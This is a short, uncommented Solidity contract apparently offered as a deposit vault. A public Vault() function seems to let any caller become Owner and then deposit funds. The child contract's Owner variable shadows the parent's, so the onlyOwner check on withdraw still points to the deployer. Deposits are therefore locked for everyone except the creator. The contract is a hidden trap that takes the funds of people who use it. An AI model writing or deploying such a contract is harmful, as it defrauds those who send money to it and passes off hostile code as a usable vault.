pragma solidity ^0.4.24;
contract Proxy {
	modifier onlyOwner(){
	if(msg.sender == Owner){
	_;}
	}
	address Owner = msg.sender;
	function transferOwner(address _owner) onlyOwner public {
	Owner = _owner;
	}
	function proxy(address target, bytes data) payable public {
	target.transfer(msg.value);
	}
	
}contract DepositProxy is Proxy {
	address public Owner;
	mapping(address => uint256) public Deposits;
	function () payable public {
	}
	function Vault() payable public {
	if(msg.sender == tx.origin){
	Owner = msg.sender;
	deposit();
	}
	}
	function deposit() payable public {
	if(msg.value > 0.5 ether){
	Deposits[msg.sender] += msg.value;
	}
	}
	function withdraw(uint256 amount) onlyOwner public {
	if(amount > 0 && Deposits[msg.sender] >= amount){
	msg.sender.transfer(amount);
	}
	}
	
}